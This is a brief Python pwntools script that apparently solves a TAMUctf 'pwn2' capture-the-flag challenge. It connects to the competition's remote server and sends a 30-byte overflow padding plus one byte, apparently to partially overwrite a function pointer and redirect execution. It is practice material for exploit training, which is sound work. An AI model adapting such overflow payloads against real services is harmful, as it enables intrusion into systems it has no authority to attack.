from pwn import *

#p = process('./pwn2')
p=remote("pwn.tamuctf.com",4322)

p.recvuntil('Which function would you like to call?')
payload='a'*30+'\xd8'
p.sendline(payload)

res=p.recvall()
print res
